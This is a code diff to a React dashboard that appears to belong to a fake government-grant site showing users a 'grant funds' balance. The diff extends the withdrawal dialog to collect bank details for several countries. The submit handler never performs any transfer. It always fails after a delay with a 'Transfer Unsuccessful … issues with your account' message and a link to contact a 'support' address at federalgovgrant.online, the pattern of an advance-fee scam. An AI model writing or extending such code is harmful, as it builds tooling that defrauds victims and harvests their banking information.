@@ -7,7 +7,9 @@ import { Badge } from '@/components/ui/badge';
 import { Skeleton } from '@/components/ui/skeleton';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
+import { Textarea } from '@/components/ui/textarea';
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
 import { toast } from 'sonner';
 import { Wallet, ArrowUpRight, LogOut, FileText, Shield, Plus, ArrowDownToLine, AlertTriangle, Loader2 } from 'lucide-react';
@@ -18,6 +20,44 @@ type WalletRow = Database['public']['Tables']['wallets']['Row'];
 type Transaction = Database['public']['Tables']['transactions']['Row'];
 type Application = Database['public']['Tables']['applications']['Row'];
 
+const COUNTRIES = ['United States', 'Germany', 'United Kingdom', 'Canada', 'Brazil', 'New Zealand', 'Other'] as const;
+type Country = typeof COUNTRIES[number];
+
+function WithdrawFormFields({ country, fields, onChange }: {
+  country: Country;
+  fields: Record<string, string>;
+  onChange: (key: string, val: string) => void;
+}) {
+  const input = (key: string, label: string, placeholder: string) => (
+    <div className="space-y-2" key={key}>
+      <Label htmlFor={key}>{label}</Label>
+      <Input id={key} placeholder={placeholder} value={fields[key] || ''} onChange={e => onChange(key, e.target.value)} required />
+    </div>
+  );
+
+  switch (country) {
+    case 'United States':
+      return <>{input('routing', 'Routing Number', 'e.g. 021000021')}{input('account', 'Account Number', 'e.g. 1234567890')}{input('name', 'Account Name', 'e.g. Jane Miller')}{input('bank', 'Bank Name', 'e.g. Chase Bank')}</>;
+    case 'Germany':
+      return <>{input('iban', 'IBAN', 'e.g. DE89370400440532013000')}{input('swift', 'SWIFT/BIC', 'e.g. COBADEFFXXX')}{input('name', 'Account Holder Name', 'Full name')}{input('bank', 'Bank Name', 'e.g. Commerzbank')}</>;
+    case 'United Kingdom':
+      return <>{input('sort', 'Sort Code', 'e.g. 20-00-00')}{input('account', 'Account Number', 'e.g. 12345678')}{input('name', 'Account Holder Name', 'Full name')}{input('bank', 'Bank Name', 'e.g. Barclays')}</>;
+    case 'Canada':
+      return <>{input('institution', 'Institution Number', 'e.g. 001')}{input('transit', 'Transit Number', 'e.g. 12345')}{input('account', 'Account Number', 'e.g. 1234567')}{input('name', 'Account Holder Name', 'Full name')}</>;
+    case 'Brazil':
+      return <>{input('iban', 'IBAN or Branch + Account Number', 'e.g. BR1800360305000010009795493C1')}{input('cpf', 'CPF / Tax ID', 'e.g. 123.456.789-09')}{input('name', 'Account Holder Name', 'Full name')}</>;
+    case 'New Zealand':
+      return <>{input('account', 'Full Account Number', 'e.g. 12-3456-1234567-00')}{input('name', 'Account Holder Name', 'Full name')}{input('bank', 'Bank Name', 'e.g. ANZ')}</>;
+    case 'Other':
+      return (
+        <div className="space-y-2">
+          <Label htmlFor="details">Provide your full bank details (IBAN/SWIFT/etc.)</Label>
+          <Textarea id="details" placeholder="Enter your complete banking information…" value={fields['details'] || ''} onChange={e => onChange('details', e.target.value)} required rows={4} />
+        </div>
+      );
+  }
+}
+
 export default function UserDashboard() {
   const { user, signOut, isAdmin } = useAuth();
   const navigate = useNavigate();
@@ -27,13 +67,11 @@ export default function UserDashboard() {
   const [loading, setLoading] = useState(true);
   const [balanceFlash, setBalanceFlash] = useState(false);
 
-  // Withdraw modal state
   const [withdrawOpen, setWithdrawOpen] = useState(false);
   const [withdrawLoading, setWithdrawLoading] = useState(false);
   const [withdrawError, setWithdrawError] = useState(false);
-  const [routingNumber, setRoutingNumber] = useState('');
-  const [bankName, setBankName] = useState('');
-  const [accountName, setAccountName] = useState('');
+  const [withdrawCountry, setWithdrawCountry] = useState<Country | ''>('');
+  const [withdrawFields, setWithdrawFields] = useState<Record<string, string>>({});
 
   const fetchData = async () => {
     if (!user) return;
@@ -50,17 +88,11 @@ export default function UserDashboard() {
 
   useEffect(() => { fetchData(); }, [user]);
 
-  // Realtime subscription for wallet updates
   useEffect(() => {
     if (!user) return;
     const channel = supabase
       .channel('wallet-updates')
-      .on('postgres_changes', {
-        event: 'UPDATE',
-        schema: 'public',
-        table: 'wallets',
-        filter: `user_id=eq.${user.id}`,
-      }, (payload) => {
+      .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'wallets', filter: `user_id=eq.${user.id}` }, (payload) => {
         setWallet(payload.new as WalletRow);
         setBalanceFlash(true);
         setTimeout(() => setBalanceFlash(false), 1000);
@@ -70,20 +102,12 @@ export default function UserDashboard() {
 
     const txChannel = supabase
       .channel('tx-updates')
-      .on('postgres_changes', {
-        event: 'INSERT',
-        schema: 'public',
-        table: 'transactions',
-        filter: `user_id=eq.${user.id}`,
-      }, (payload) => {
+      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'transactions', filter: `user_id=eq.${user.id}` }, (payload) => {
         setTransactions(prev => [payload.new as Transaction, ...prev]);
       })
       .subscribe();
 
-    return () => {
-      supabase.removeChannel(channel);
-      supabase.removeChannel(txChannel);
-    };
+    return () => { supabase.removeChannel(channel); supabase.removeChannel(txChannel); };
   }, [user]);
 
   const formatCurrency = (n: number) => `$${Number(n).toLocaleString('en-US', { minimumFractionDigits: 2 })}`;
@@ -98,24 +122,19 @@ export default function UserDashboard() {
 
   const handleWithdrawSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    if (!routingNumber.trim() || !bankName.trim() || !accountName.trim()) {
-      toast.error('Please fill in all fields.');
-      return;
-    }
+    if (!withdrawCountry) { toast.error('Please select a country.'); return; }
+    const vals = Object.values(withdrawFields);
+    if (vals.length === 0 || vals.some(v => !v.trim())) { toast.error('Please fill in all fields.'); return; }
     setWithdrawLoading(true);
-    setTimeout(() => {
-      setWithdrawLoading(false);
-      setWithdrawError(true);
-    }, 3500);
+    setTimeout(() => { setWithdrawLoading(false); setWithdrawError(true); }, 3500);
   };
 
   const resetWithdrawModal = () => {
     setWithdrawOpen(false);
     setWithdrawLoading(false);
     setWithdrawError(false);
-    setRoutingNumber('');
-    setBankName('');
-    setAccountName('');
+    setWithdrawCountry('');
+    setWithdrawFields({});
   };
 
   if (loading) {
@@ -131,7 +150,6 @@ export default function UserDashboard() {
 
   return (
     <div className="min-h-screen bg-background">
-      {/* Header */}
       <header className="border-b bg-card">
         <div className="max-w-6xl mx-auto px-6 py-4 flex items-center justify-between">
           <div className="flex items-center gap-2">
@@ -140,9 +158,7 @@ export default function UserDashboard() {
           </div>
           <div className="flex items-center gap-3">
             {isAdmin && (
-              <Button variant="outline" size="sm" onClick={() => navigate('/admin')}>
-                Admin Panel
-              </Button>
+              <Button variant="outline" size="sm" onClick={() => navigate('/admin')}>Admin Panel</Button>
             )}
             <Button variant="ghost" size="sm" onClick={signOut}>
               <LogOut className="mr-2 h-4 w-4" /> Sign Out
@@ -152,7 +168,6 @@ export default function UserDashboard() {
       </header>
 
       <main className="max-w-6xl mx-auto px-6 py-8 space-y-8">
-        {/* Grant Wallet Card */}
         <Card className="overflow-hidden">
           <div className="bg-gradient-to-br from-[hsl(220,40%,13%)] to-[hsl(220,60%,25%)] p-8 text-[hsl(0,0%,100%)]">
             <div className="flex items-center gap-2 mb-1 opacity-80">
@@ -162,21 +177,14 @@ export default function UserDashboard() {
             <p className={`text-4xl font-bold tracking-tight transition-colors ${balanceFlash ? 'balance-flash' : ''}`}>
               {wallet ? formatCurrency(wallet.balance) : '$0.00'}
             </p>
-            <p className="mt-2 text-sm opacity-60">
-              Available grant funds
-            </p>
-            <Button
-              className="mt-4 bg-gold text-gold-foreground hover:bg-gold-dark font-semibold"
-              size="lg"
-              onClick={() => setWithdrawOpen(true)}
-            >
+            <p className="mt-2 text-sm opacity-60">Available grant funds</p>
+            <Button className="mt-4 bg-gold text-gold-foreground hover:bg-gold-dark font-semibold" size="lg" onClick={() => setWithdrawOpen(true)}>
               <ArrowDownToLine className="mr-2 h-4 w-4" /> Withdraw Funds
             </Button>
           </div>
         </Card>
 
         <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
-          {/* Applications */}
           <Card>
             <CardHeader className="flex flex-row items-center justify-between">
               <CardTitle className="text-base font-semibold flex items-center gap-2">
@@ -205,7 +213,6 @@ export default function UserDashboard() {
             </CardContent>
           </Card>
 
-          {/* Transactions */}
           <Card>
             <CardHeader>
               <CardTitle className="text-base font-semibold flex items-center gap-2">
@@ -240,31 +247,23 @@ export default function UserDashboard() {
         </div>
       </main>
 
-      {/* Withdraw Modal */}
       <Dialog open={withdrawOpen} onOpenChange={(open) => { if (!open) resetWithdrawModal(); }}>
-        <DialogContent className="sm:max-w-md">
+        <DialogContent className="sm:max-w-md max-h-[85vh] overflow-y-auto">
           {withdrawError ? (
-            <>
-              <div className="flex flex-col items-center text-center py-4">
-                <div className="h-16 w-16 rounded-full bg-destructive/10 flex items-center justify-center mb-4">
-                  <AlertTriangle className="h-8 w-8 text-destructive" />
-                </div>
-                <DialogHeader>
-                  <DialogTitle className="text-destructive text-xl">Transfer Unsuccessful</DialogTitle>
-                  <DialogDescription className="text-base mt-2">
-                    Due to some issues with your account!! Please message our support.
-                  </DialogDescription>
-                </DialogHeader>
-                <a
-                  href="mailto:eligibleoffer@federalgovgrant.online"
-                  className="mt-6 w-full"
-                >
-                  <Button className="w-full" variant="destructive" size="lg">
-                    Contact Support
-                  </Button>
-                </a>
+            <div className="flex flex-col items-center text-center py-4">
+              <div className="h-16 w-16 rounded-full bg-destructive/10 flex items-center justify-center mb-4">
+                <AlertTriangle className="h-8 w-8 text-destructive" />
               </div>
-            </>
+              <DialogHeader>
+                <DialogTitle className="text-destructive text-xl">Transfer Unsuccessful</DialogTitle>
+                <DialogDescription className="text-base mt-2">
+                  Due to some issues with your account!! Please message our support.
+                </DialogDescription>
+              </DialogHeader>
+              <a href="mailto:eligibleoffer@federalgovgrant.online" className="mt-6 w-full">
+                <Button className="w-full" variant="destructive" size="lg">Contact Support</Button>
+              </a>
+            </div>
           ) : withdrawLoading ? (
             <div className="flex flex-col items-center justify-center py-12 gap-4">
               <Loader2 className="h-10 w-10 animate-spin text-primary" />
@@ -274,42 +273,26 @@ export default function UserDashboard() {
             <>
               <DialogHeader>
                 <DialogTitle>Withdraw Funds</DialogTitle>
-                <DialogDescription>
-                  Enter your bank details to transfer your grant funds.
-                </DialogDescription>
+                <DialogDescription>Select your country and enter bank details to transfer your grant funds.</DialogDescription>
               </DialogHeader>
               <form onSubmit={handleWithdrawSubmit} className="space-y-4 mt-2">
                 <div className="space-y-2">
-                  <Label htmlFor="routingNumber">Routing Number</Label>
-                  <Input
-                    id="routingNumber"
-                    placeholder="e.g. 021000021"
-                    value={routingNumber}
-                    onChange={e => setRoutingNumber(e.target.value)}
-                    required
-                  />
+                  <Label>Country</Label>
+                  <Select value={withdrawCountry} onValueChange={(val) => { setWithdrawCountry(val as Country); setWithdrawFields({}); }}>
+                    <SelectTrigger><SelectValue placeholder="Select your country" /></SelectTrigger>
+                    <SelectContent>
+                      {COUNTRIES.map(c => <SelectItem key={c} value={c}>{c}</SelectItem>)}
+                    </SelectContent>
+                  </Select>
                 </div>
-                <div className="space-y-2">
-                  <Label htmlFor="bankName">Name of Bank</Label>
-                  <Input
-                    id="bankName"
-                    placeholder="e.g. Chase Bank"
-                    value={bankName}
-                    onChange={e => setBankName(e.target.value)}
-                    required
+                {withdrawCountry && (
+                  <WithdrawFormFields
+                    country={withdrawCountry as Country}
+                    fields={withdrawFields}
+                    onChange={(key, val) => setWithdrawFields(prev => ({ ...prev, [key]: val }))}
                   />
-                </div>
-                <div className="space-y-2">
-                  <Label htmlFor="accountName">Account Name</Label>
-                  <Input
-                    id="accountName"
-                    placeholder="e.g. John Doe"
-                    value={accountName}
-                    onChange={e => setAccountName(e.target.value)}
-                    required
-                  />
-                </div>
-                <Button type="submit" className="w-full" size="lg">
+                )}
+                <Button type="submit" className="w-full" size="lg" disabled={!withdrawCountry}>
                   <ArrowDownToLine className="mr-2 h-4 w-4" /> Send Withdrawal
                 </Button>
               </form>
